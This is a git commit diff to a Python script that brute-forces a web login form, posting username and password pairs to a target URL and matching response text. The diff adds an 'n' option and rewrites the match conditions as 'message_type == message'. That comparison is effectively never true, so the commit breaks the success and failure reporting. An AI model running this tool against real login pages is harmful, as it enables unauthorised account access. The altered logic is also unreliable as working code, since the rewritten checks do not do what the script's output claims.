afb028dd0edc490a4a5757ebbe3e732a402fef16
W r e n c h <134978254+Jeanpseven@users.noreply.github.com>
2024-09-27 19:03:15 -0300

    Update brute.py

--- brute.py
+++ brute.py
@@ -11,12 +11,14 @@ username_field = input("Digite o campo de username (ex: 'username'): ")
 password_field = input("Digite o campo de senha (ex: 'password'): ")
 
 # Escolha de tipo de mensagem
-message_type = input("Deseja configurar mensagem de erro ou de sucesso? (digite 'erro' ou 'sucesso'): ").strip().lower()
+message_type = input("Deseja configurar mensagem de erro ou de sucesso? ((e)rro / (s)ucesso / (n)ão): ").strip().lower()
 
-if message_type == 'sucesso':
+if message_type == 's':
     message = input("Digite a mensagem de sucesso (ex: 'Welcome back'): ").strip()
-elif message_type == 'erro':
+elif message_type == 'e':
     message = input("Digite a mensagem de erro (ex: 'Invalid credentials'): ").strip()
+elif message_type == 'n':
+    message = ''
 else:
     print("Opção inválida, por favor escolha 'erro' ou 'sucesso'.")
     sys.exit()
@@ -39,12 +41,12 @@ for username in usernames:
             r = requests.post(target, data={username_field: username, password_field: password})
             
             if message.encode() in r.content:
-                if message_type == 'sucesso':
+                if message_type == message:
                     sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!\n".format(password.decode(), username))
                     sys.exit()
-                elif message_type == 'erro':
+                elif message_type == message:
                     sys.stdout.write("\t[!] Invalid password '{}' for user '{}'!\n".format(password.decode(), username))
             
-        if message_type == 'sucesso':
+        if message_type == message:
             sys.stdout.write("\tNo valid password found for '{}'.\n".format(username))
         sys.stdout.flush()
